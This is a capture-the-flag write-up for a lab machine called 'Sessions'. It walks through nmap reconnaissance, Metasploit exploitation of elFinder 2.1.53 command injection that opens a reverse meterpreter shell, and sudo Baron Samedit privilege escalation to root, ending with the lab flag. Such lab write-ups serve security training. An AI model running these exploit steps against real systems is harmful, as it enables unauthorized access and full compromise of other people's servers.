### Sessions Exercise
 
IP: 10.129.66.118
 
---
 
### Recon
 
I start off by running an nmap scan against the target.
 
```diff
+ $ sudo nmap -sT -sV -sC -A -F -v 10.129.66.118
```
 
	PORT   STATE SERVICE VERSION
	22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4
	80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
	|_http-title: elFinder 2.1.x source version with PHP connector
 
The scan shows that an ssh service, as well as an apache httpd web service, are being ran.
 
---
 
### Web Enumeration
 
I navigate to the IP in a web browser and notice that it's some sort of file finder/uploader. Inspecting the HTML I notice a comment talking about a file needing renaming, so I navigate over to it, finding a file exposing the actual service, elFinder.
 
```diff
+ $ curl http://10.129.66.118/main.default.js
```
 
	/**
	 * elFinder client options and main script for RequireJS
	 *
	 * Rename "main.default.js" to "main.js" and edit it if you need configure elFinder options or any things. And use that in elfinder.html.
	 * e.g. `<script data-main="./js" src="./require.js"></script>`
	 **/
 
&#x1F6A9; found **elFinder**.
 
---
 
### Exploitation
 
Searching for an elFinder exploit on Metasploit, I find one for command injection, configure the options, and run it.
 
```diff
+ msf6 > search elFinder
+ msf6 > use linux/http/elfinder_archive_cmd_injection
+ msf6 exploit(linux/http/elfinder_archive_cmd_injection) > set rhosts 10.129.66.118
+ msf6 exploit(linux/http/elfinder_archive_cmd_injection) > set lhost 10.10.14.36
+ msf6 exploit(linux/http/elfinder_archive_cmd_injection) > run
```
 
	[*] Started reverse TCP handler on 10.10.14.36:4444
	[+] The target appears to be vulnerable. elFinder running version 2.1.53
	[*] Uploading file TCBphOoB.txt to elFinder
	[+] Text file was successfully uploaded!
	[*] Attempting to create archive YDnEYAiBVN.zip
	[+] Archive was successfully created!
	[*] Sending payload to 10.129.66.118
	[*] Meterpreter session 1 opened (10.10.14.36:4444 -> 10.129.66.118:35816)
 
What resulted was a meterpreter shell on the web server.
 
---
 
### Privilege Escalation
 
From this I upgraded to a tty and then backgrounded my shell session and metasploit session. One of the questions mentions an old version of sudo is running, so I search Metasploit for an exploit on this and land on `linux/local/sudo_baron_samedit`.
 
```diff
+ msf6 > search sudo baron samedit
+ msf6 > use linux/local/sudo_baron_samedit
+ msf6 exploit(linux/local/sudo_baron_samedit) > set session 1
+ msf6 exploit(linux/local/sudo_baron_samedit) > set lhost 10.10.14.36
+ msf6 exploit(linux/local/sudo_baron_samedit) > run
```
 
	[!] The service is running, but could not be validated. sudo 1.8.31 may be a vulnerable build.
	[*] Using automatically selected target: Ubuntu 20.04 x64 (sudo v1.8.31, libc v2.31)
	[*] Meterpreter session 2 opened (10.10.14.36:4444 -> 10.129.66.118:36042)
 
Configuring the exploit and running it granted root access.
 
#### Confirm root and grab the flag from /root:
 
```diff
+ (Meterpreter 2)(/tmp) > getuid
+ (Meterpreter 2)(/tmp) > cd /root
+ (Meterpreter 2)(/root) > ls
+ (Meterpreter 2)(/root) > cat flag.txt
```
 
	Server username: root
	HTB{5e55ion5_4r3_sw33t}
 
&#x1F6A9; found **HTB{5e55ion5_4r3_sw33t}**.
 
